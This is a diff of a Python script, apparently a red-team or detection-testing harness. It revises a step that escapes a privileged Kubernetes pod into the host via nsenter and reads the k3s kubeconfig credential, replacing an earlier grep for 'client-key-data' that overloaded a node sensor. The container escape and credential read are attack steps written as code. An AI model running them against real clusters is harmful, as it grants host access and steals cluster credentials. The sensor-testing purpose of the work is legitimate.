@@ -660,19 +660,24 @@ def step_19_deploy_privileged(ctx):
 
 
 def step_20_escape_and_loot(ctx):
-    """unit-7: enter the host env, prove the node, hunt k3s credentials. Identical."""
+    """unit-7: enter the host env, prove the node, read the k3s credential.
+
+    BOUNDED. Step 20 is nsenter + the single k3s.yaml read, no whole-fs grep.
+    The earlier search-interesting-files over /host/var/lib/rancher/k3s (the k3s
+    data dir) ran grep across 13866 files and DoS'd node-agent on the node —
+    dc_snoop went dark for three minutes and erased the evidence of this step AND
+    everything else on the node (B1c7). Those 13866 opens were also all that
+    "grounded" k3s-credential-read: grep noise over the data dir, not the
+    credential. The honest witness is the single read of the kubeconfig, which
+    read-sensitive-file does directly and which does not storm the sensor."""
     priv = "ns/agent-system/pod/ran-privileged"
     ok = execute("escape-container-via-nsenter", priv,
                  {"TARGET": "1", "CMD": "hostname"},
                  "unit-7/1: enter host env, prove the node")
-    for path in ("/host/etc/rancher/k3s", "/host/var/lib/rancher/k3s"):
-        execute("search-interesting-files", priv,
-                {"MOUNT_PATH": path, "PATTERN": "client-key-data"},
-                f"unit-7/2: loot {path}")
-    execute("read-sensitive-file", priv,
-            {"MOUNT_PATH": "/host", "PATH": "/etc/rancher/k3s/k3s.yaml"},
-            "unit-7/3: read k3s kubeconfig")
-    return ok
+    read = execute("read-sensitive-file", priv,
+                   {"MOUNT_PATH": "/host", "PATH": "/etc/rancher/k3s/k3s.yaml"},
+                   "unit-7/2: read k3s kubeconfig")
+    return ok and read
 
 
 STEPS = [
